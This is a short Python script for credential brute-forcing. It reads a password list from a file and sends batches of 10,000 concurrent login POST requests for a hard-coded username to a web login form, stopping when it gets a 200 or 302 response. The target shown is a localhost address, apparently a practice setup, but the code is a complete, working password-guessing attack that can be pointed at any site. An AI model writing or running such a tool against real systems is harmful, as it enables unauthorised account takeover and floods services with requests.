import asyncio
import httpx
import datetime
from timeit import default_timer as timer
from sys import exit
import time

# 1020318
PASSWORDS = [item.replace("\n", "") for item in open('passwords.txt', 'r', encoding='utf8').readlines()]
TOTAL_PASSWORDS = len(PASSWORDS)
PASSWORDS = [PASSWORDS[x:x+10000] for x in range(0, TOTAL_PASSWORDS, 10000)]

start = timer()
async def do_request(url, user, username_field, password_field):
    tmplist = []
    for passwords in PASSWORDS: # passwords = chunk of 10 passwords.
        tmplist = passwords
        async with httpx.AsyncClient() as client:
            tasks = (client.post(url, data={username_field: user, password_field: password}) for password in passwords)
            reqs = await asyncio.gather(*tasks)

        results = [req for req in reqs]
        for id, result in enumerate(results):
            if result.status_code == 200 or result.status_code == 302:
                print('USER FOUND!!!!!!')
                print(user, tmplist[id])
                end = timer()
                print("Ended bruteforce...", datetime.datetime.now())
                print('Total time', end-start)
                exit()
    
    end = timer() 
    print('password not found...', end-start)

def do_users(url, username_field, password_field):
    asyncio.run(do_request(url, 'jorge_gonzalez', username_field, password_field))

def main():
    print("Passwords loaded..")
    print("Starting bruteforce...", datetime.datetime.now())
    do_users('http://localhost:5000/login', 'username', 'password')

if __name__ == '__main__':
    
    main()